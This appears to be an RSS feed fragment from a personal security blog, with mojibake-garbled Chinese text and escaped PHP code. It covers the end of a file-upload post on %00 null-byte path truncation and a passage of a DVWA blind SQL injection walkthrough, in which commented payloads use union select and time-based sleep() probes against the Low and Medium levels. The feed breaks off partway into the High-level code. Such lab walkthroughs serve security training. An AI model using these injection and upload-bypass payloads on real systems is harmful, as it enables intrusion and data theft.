        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// No
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Delete any temp files
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Invalid file
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// Generate Anti-CSRF token
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;generateSessionToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;extension&#34;&gt;Extension&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;00%æˆªæ–­&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$is_upload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// ç™½åå•
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$ext_arr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$file_ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strrpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ext_arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// æ³¨æ„è¿™ä¸ªä½ç½®
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// æœ€åæ‹¼æ¥çš„å‚¨å­˜è·¯å¾„ï¼Œæ˜¯ç”±ç”¨æˆ·æäº¤ä¸Šçš„æ•°æ®æ¥åšä¸ºè·¯å¾„
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$img_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;save_path&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file_ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$temp_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$img_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$is_upload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ä¸Šä¼ å¤±è´¥&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»£ç é‡‡ç”¨çš„ç™½åå•æ ¡éªŒï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡æ ¼å¼ï¼Œç†è®ºä¸Šè¿™ä¸ªä¸Šä¼ æ˜¯ä¸å¥½ç»•è¿‡çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯åé¢é‡‡ç”¨ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œæ˜¯è·¯å¾„æ‹¼æ¥çš„å½¢å¼ï¼Œè€Œè·¯å¾„åˆæ˜¯ä»å‰ç«¯è·å–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è·¯å¾„ä¸Šåšæ‰‹è„šã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä¸‹ä¸Šä¼ ï¼Œæ˜¾ç¤ºæ–‡ä»¶è·¯å¾„ä¸­æœ‰ä¸ªç©ºæ ¼ï¼Œè¿™å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç©ºæ ¼ï¼Œè€Œæ˜¯%00æˆªæ–­åæ˜¾ç¤ºæˆçš„ç©ºæ ¼ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨urlä¸­%00è¡¨ç¤ºascllç ä¸­çš„0 ï¼Œè€Œasciiä¸­0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œæ‰€ä»¥å½“urlä¸­å‡ºç°%00æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸ (phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜)&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Sql Injection Blind</title>
        <link>https://sdttttt.github.io/p/sql-injection-blind/</link>
        <pubDate>Fri, 10 Apr 2020 11:11:22 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/sql-injection-blind/</guid>
        <description>&lt;p&gt;è¿”å›çš„ç»“æœé›†æ— æ³•çœ‹åˆ°ï¼Œåªèƒ½é€šè¿‡ä¸€äº›é¡µé¢æ˜¾ç¤ºæˆ–çŠ¶æ€æ¥åˆ¤æ–­ã€‚
åƒçå­ä¸€æ ·ã€‚&lt;/p&gt;
&lt;p&gt;DVWA SQL Injection blind è¿‡å…³ç§˜ç±.&lt;/p&gt;
&lt;h3 id=&#34;low&#34;&gt;Low&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Check database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$getid&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// æ²¡æœ‰ä¸€ç‚¹ç‚¹é˜²å¤‡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å°è¯•æ„é€ : (ç”±äºçœ‹ä¸åˆ°ç»“æœé›†ï¼Œæ‰€ä»¥è„±è£¤å­çš„è¯­å¥æ˜¯æ— æ•ˆ)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;0&amp;#39; union select 1,2 # &amp;#39;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// User ID exists in the database. &amp;lt;å­˜åœ¨æ³¨å…¥æ¼æ´&amp;gt;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;0&amp;#39; union select 1,if(length( database())=4,sleep(4),2) # &amp;#39;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$getid&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Removed &amp;#39;or die&amp;#39; to suppress mysql errors
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// The &amp;#39;@&amp;#39; character suppresses errors
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// User wasn&amp;#39;t found, so the page wasn&amp;#39;t!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39; 404 Not Found&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;mysql_close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;miedum&#34;&gt;MIEDUM&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Submit&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Check database
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$getid&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// å°è¯•æ„é€ :
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,2;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// ä»¥ä¸Šåˆ¤æ–­å­˜åœ¨æ³¨å…¥æ¼æ´
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,if(length(database()) &amp;gt; 4, sleep(3), 2)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$getid&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Removed &amp;#39;or die&amp;#39; to suppress mysql errors
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get results
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// The &amp;#39;@&amp;#39; character suppresses errors
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Feedback for end user
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;//mysql_close();
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;high&#34;&gt;High&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Get input
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

